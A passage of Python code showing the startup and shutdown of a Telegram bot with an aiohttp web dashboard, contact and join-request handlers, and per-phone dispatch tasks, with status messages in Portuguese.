    web_app.router.add_get("/api/dashboard/logs", api_dashboard_logs)
    web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)

    runner = web.AppRunner(web_app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", WEBAPP_PORT)
    await site.start()

    # --- Bot (python-telegram-bot) ---
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    application.add_handler(ChatJoinRequestHandler(handle_join_request))

    print(f"\n🤖 Bot + Mini App rodando!")
    print(f"📝 Comando: /start")
    print(f"🌐 Web Server: http://0.0.0.0:{WEBAPP_PORT}")
    print(f"🔗 Mini App URL: {WEBAPP_URL}")
    print(f"📊 Dashboard: http://0.0.0.0:{WEBAPP_PORT}/dashboard")
    print(f"👤 Join Request: ATIVO\n")

    async with application:
        await application.start()
        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)

        # Carregar stats salvas
        load_stats()

        # Carregar sessões existentes e iniciar disparo
        await carregar_sessoes()

        # Mantém rodando até Ctrl+C
        stop_event = asyncio.Event()
        try:
            await stop_event.wait()
        except (KeyboardInterrupt, SystemExit):
            pass
        finally:
            # Cancelar todos os disparos ativos
            for phone, task in disparo_tasks.items():
                task.cancel()
                print(f"[SHUTDOWN] 🛑 Disparo cancelado para {phone}")
            await application.updater.stop()
            await application.stop()
            await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot encerrado.")
